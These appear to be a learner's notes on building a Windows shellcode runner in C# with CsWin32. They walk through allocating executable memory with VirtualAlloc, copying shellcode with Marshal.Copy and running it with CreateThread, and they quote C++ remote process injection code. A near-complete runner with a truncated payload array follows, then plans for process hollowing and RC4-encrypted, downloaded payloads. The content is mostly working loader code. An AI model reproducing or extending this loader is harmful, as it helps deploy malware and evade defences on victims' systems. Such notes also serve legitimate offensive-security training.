
### VirtualAlloc

- Win32 api C++
```c++
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

- In CsWin32
```csharp
internal static extern unsafe void* VirtualAlloc([Optional] void* lpAddress, UIntPtr dwSize, winmdroot.System.Memory.VIRTUAL_ALLOCATION_TYPE flAllocationType, winmdroot.System.Memory.PAGE_PROTECTION_FLAGS flProtect);
```

- VIRTUAL_ALLOCATION_TYPE
```csharp
internal enum VIRTUAL_ALLOCATION_TYPE : uint
{
MEM_COMMIT = 0x00001000,
MEM_RESERVE = 0x00002000,
MEM_RESET = 0x00080000,
MEM_RESET_UNDO = 0x01000000,
MEM_REPLACE_PLACEHOLDER = 0x00004000,
MEM_LARGE_PAGES = 0x20000000,
MEM_RESERVE_PLACEHOLDER = 0x00040000,
MEM_FREE = 0x00010000,
}
```
- PAGE_PROTECTION_FLAGS
```csharp
internal enum PAGE_PROTECTION_FLAGS : uint
{
	PAGE_NOACCESS = 0x00000001,
	PAGE_READONLY = 0x00000002,
	PAGE_READWRITE = 0x00000004,
	PAGE_WRITECOPY = 0x00000008,
	PAGE_EXECUTE = 0x00000010,
	PAGE_EXECUTE_READ = 0x00000020,
	PAGE_EXECUTE_READWRITE = 0x00000040,
	PAGE_EXECUTE_WRITECOPY = 0x00000080,
	PAGE_GUARD = 0x00000100,
	PAGE_NOCACHE = 0x00000200,
	PAGE_WRITECOMBINE = 0x00000400,
	PAGE_GRAPHICS_NOACCESS = 0x00000800,
	PAGE_GRAPHICS_READONLY = 0x00001000,
	PAGE_GRAPHICS_READWRITE = 0x00002000,
	PAGE_GRAPHICS_EXECUTE = 0x00004000,
	PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
	PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
	PAGE_GRAPHICS_COHERENT = 0x00020000,
	PAGE_GRAPHICS_NOCACHE = 0x00040000,
	PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
	PAGE_REVERT_TO_FILE_MAP = 0x80000000,
	PAGE_TARGETS_NO_UPDATE = 0x40000000,
	PAGE_TARGETS_INVALID = 0x40000000,
	PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
	PAGE_ENCLAVE_MASK = 0x10000000,
	PAGE_ENCLAVE_DECOMMIT = 0x10000000,
	PAGE_ENCLAVE_SS_FIRST = 0x10000001,
	PAGE_ENCLAVE_SS_REST = 0x10000002,
	SEC_PARTITION_OWNER_HANDLE = 0x00040000,
	SEC_64K_PAGES = 0x00080000,
	SEC_FILE = 0x00800000,
	SEC_IMAGE = 0x01000000,
	SEC_PROTECTED_IMAGE = 0x02000000,
	SEC_RESERVE = 0x04000000,
	SEC_COMMIT = 0x08000000,
	SEC_NOCACHE = 0x10000000,
	SEC_WRITECOMBINE = 0x40000000,
	SEC_LARGE_PAGES = 0x80000000,
	SEC_IMAGE_NO_EXECUTE = 0x11000000,
}
```

- using just PInvoke.Net signatures
	- lpAddress: starting address of region to allocate
		- `IntPtr.Zero` in C# is a static read-only field of the `IntPtr` struct that represents a pointer or handle that has been initialized to zero. It is commonly used to represent a null pointer or handle in managed code, similar to `NULL` in unmanaged code (such as in C or C++).
	- dwSize: The size of the region, in bytes. If the _lpAddress_ parameter is **NULL**, this value is rounded up to the next page boundary.
	- flAllocationType: type of memory allocation. Setting to MEM_COMMIT | MEM_RESERVE
	- flProtect:  memory protection for the region of pages to be allocated (PAGE_EXECUTE_READWRITE = 0x00000040)
```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

* Using CsWin32 this becomes:
```csharp
void* allocatedMemory =  PInvoke.VirtualAlloc(null, msize, VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
```

### Marshal.Copy

`Marshal.Copy` in C# is a method provided by the `System.Runtime.InteropServices.Marshal` class that allows copying data between unmanaged memory and managed arrays. This is useful when you need to interact with unmanaged code that expects data in a specific format or location in memory.

- Many methods for overloading (https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-8.0)
- Using this one (Copies data from a one-dimensional, managed 8-bit unsigned integer array to an unmanaged memory pointer.):
```csharp
public static void Copy (byte[] source, int startIndex, IntPtr destination, int length);
```

- buf is the byte array representing shellcode
- startIndex (Int32) zero-based index in the source array where copying should start
- destintaton (IntPtr) The memory pointer to copy to.
- length (Int32) number of array elements to copy
```csharp
Marshal.Copy(buf, 0, allocatedMemoryIntPtr, buf.Length);
```

- Need to take `void* allocatedMemory` and use the allocation in `Marshal.Copy`
- `IntPtr` can take a `void*` as an argument. Initializes a new instance of `IntPtr` using the specified pointer to an unspecified type.
```csharp
[System.CLSCompliant(false)]
public IntPtr (void* value);
```

- our code becomes
```csharp
IntPtr allocatedMemoryIntPtr = new IntPtr(allocatedMemory);
Marshal.Copy(buf, 0, allocatedMemoryIntPtr, buf.Length);
```

Next step in the process is to create a process thread for the shellcode to run.

* Using PInvoke.net conversion:
```csharp
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```
- Arguments
	- 

- Win32 api CreateThread which creates a thread to execute in the virtual address space of the calling process.
```c++
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

- Win32 LPSECURITY_ATTRIBUTES
```csharp
		internal partial struct SECURITY_ATTRIBUTES
		{
			internal uint nLength;
			internal unsafe void* lpSecurityDescriptor;
			internal winmdroot.Foundation.BOOL bInheritHandle;
		}
```

- CsWin32 translation:
```csharp
internal static unsafe Microsoft.Win32.SafeHandles.SafeFileHandle CreateThread(winmdroot.Security.SECURITY_ATTRIBUTES? lpThreadAttributes, UIntPtr dwStackSize, winmdroot.System.Threading.LPTHREAD_START_ROUTINE lpStartAddress, void* lpParameter, winmdroot.System.Threading.THREAD_CREATION_FLAGS dwCreationFlags, uint* lpThreadId)
{
	winmdroot.Security.SECURITY_ATTRIBUTES lpThreadAttributesLocal = lpThreadAttributes ?? default(winmdroot.Security.SECURITY_ATTRIBUTES);
	winmdroot.Foundation.HANDLE __result = PInvoke.CreateThread(lpThreadAttributes.HasValue ? &lpThreadAttributesLocal : null, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
	return new Microsoft.Win32.SafeHandles.SafeFileHandle(__result, ownsHandle: true);
}

[DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
internal static extern unsafe winmdroot.Foundation.HANDLE CreateThread([Optional] winmdroot.Security.SECURITY_ATTRIBUTES* lpThreadAttributes, UIntPtr dwStackSize, winmdroot.System.Threading.LPTHREAD_START_ROUTINE lpStartAddress, [Optional] void* lpParameter, winmdroot.System.Threading.THREAD_CREATION_FLAGS dwCreationFlags, [Optional] uint* lpThreadId);

```

In C#, the difference between `winmdroot.Security.SECURITY_ATTRIBUTES?` and `winmdroot.Security.SECURITY_ATTRIBUTES*` relates to how these types handle nullable types and pointers, respectively. Here’s a breakdown of each:

### `winmdroot.Security.SECURITY_ATTRIBUTES?`

- **Nullable Type**: The `?` suffix in C# indicates a nullable type. This means that the `SECURITY_ATTRIBUTES` structure can either hold a value of type `SECURITY_ATTRIBUTES` or it can be `null`.
- **Usage**: This is typically used when you want to represent a value type that can also be `null`. It's often used in high-level managed code where you want the convenience and safety of dealing with `null` values directly.

Example:
```csharp
winmdroot.Security.SECURITY_ATTRIBUTES? securityAttributes = null;

if (someCondition)
{
    securityAttributes = new winmdroot.Security.SECURITY_ATTRIBUTES();
}
```

### `winmdroot.Security.SECURITY_ATTRIBUTES*`

- **Pointer Type**: The `*` suffix in C# indicates a pointer to a `SECURITY_ATTRIBUTES` structure. This is a lower-level construct that directly deals with memory addresses.
- **Usage**: Pointer types are typically used in unsafe contexts where you need to interact directly with memory, such as interop scenarios with unmanaged code. Using pointers requires an `unsafe` context in C#.

Example:
```csharp
unsafe
{
    winmdroot.Security.SECURITY_ATTRIBUTES securityAttributes = new winmdroot.Security.SECURITY_ATTRIBUTES();
    winmdroot.Security.SECURITY_ATTRIBUTES* ptr = &securityAttributes;
    
    // Use the pointer to manipulate the SECURITY_ATTRIBUTES structure directly
    ptr->nLength = sizeof(winmdroot.Security.SECURITY_ATTRIBUTES);
}
```

### Key Differences

1. **Nullability**:
   - `winmdroot.Security.SECURITY_ATTRIBUTES?` can represent either a `SECURITY_ATTRIBUTES` value or `null`.
   - `winmdroot.Security.SECURITY_ATTRIBUTES*` represents a pointer to a `SECURITY_ATTRIBUTES` structure and cannot be `null` unless explicitly set to `null`.

2. **Safety and Usage Context**:
   - `winmdroot.Security.SECURITY_ATTRIBUTES?` is used in safe, managed code where the .NET runtime handles memory management and type safety.
   - `winmdroot.Security.SECURITY_ATTRIBUTES*` is used in unsafe code blocks where you need fine-grained control over memory and performance, often in interoperability scenarios with unmanaged code.

3. **Memory Management**:
   - `winmdroot.Security.SECURITY_ATTRIBUTES?` relies on the garbage collector to manage memory, reducing the risk of memory leaks and pointer errors.
   - `winmdroot.Security.SECURITY_ATTRIBUTES*` requires manual memory management and care to avoid memory leaks, invalid memory access, and other pointer-related errors.

### When to Use Each

- **Use `winmdroot.Security.SECURITY_ATTRIBUTES?`** when you want the safety and convenience of a nullable type in managed code.
- **Use `winmdroot.Security.SECURITY_ATTRIBUTES*`** when you need to perform low-level memory manipulations or interact with unmanaged code, and you are comfortable handling pointers and memory management manually.

Choosing between these two depends on the specific requirements of your application and your comfort level with handling pointers and memory directly.

### C++ code example

- https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
```c++
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
```    

### CreateThread function value settings in C\#


 IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
CreateThread(winmdroot.Security.SECURITY_ATTRIBUTES? lpThreadAttributes, UIntPtr dwStackSize, winmdroot.System.Threading.LPTHREAD_START_ROUTINE lpStartAddress, void* lpParameter, winmdroot.System.Threading.THREAD_CREATION_FLAGS dwCreationFlags, uint* lpThreadId)

| Argument Name      |          Argument Type |  Setting for shellcode runner |
| ------------------ | ---------------------: | ----------------------------: |
| lpThreadAttributes |                        |                          null |
| dwStackSize        |                UIntPtr |                    (UIntPtr)0 |
| lpStartAddress     | LPTHREAD_START_ROUTINE |                               |
| lpParameter        |                  void* |                               |
| dwCreationFlags    |  THREAD_CREATION_FLAGS | THREAD_CREATE_RUN_IMMEDIATELY |
| lpThreadId         |                  uint* |                               |
### Scratch all of that...figured this out

#### Shellcode runner using CsWin32

- Thread runs until process is killed
- If used, would need to migrate process to something else due to the nature of the thread
- code snippet 
```csharp
using System;
using System.Runtime.InteropServices;
using Windows.Win32;
using Windows.Win32.System.Memory;
using Windows.Win32.Foundation;

namespace ShellCodeRunnerCsWin32
{
    internal class Program
    {


        static unsafe void Main(string[] args)
        {



            byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,...}

           UIntPtr msize = (UIntPtr)(uint)buf.Length;
            
           void* allocatedMemory = PInvoke.VirtualAlloc(null, msize, VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

           Marshal.Copy(buf, 0, (IntPtr)allocatedMemory, buf.Length);

           IntPtr n = new IntPtr(&allocatedMemory);

  
           Windows.Win32.System.Threading.LPTHREAD_START_ROUTINE allocatedMemoryPointer = (Windows.Win32.System.Threading
              .LPTHREAD_START_ROUTINE)Marshal.GetDelegateForFunctionPointer((IntPtr)allocatedMemory, typeof(Windows.Win32.System.Threading
              .LPTHREAD_START_ROUTINE));


           HANDLE h = PInvoke.CreateThread(
               null,
               0,
               allocatedMemoryPointer,
               (void*)0,
               0
               );

           PInvoke.WaitForSingleObject(h, 0xFFFFFFFF);

```

### To Do:
- take this code and create other versions (eg process hollowing)
- add in rc4 encryption for the payload
	- get decryption key through http or command line
	- download the payload or read from a file
- maybe add some command line arguments for flexibility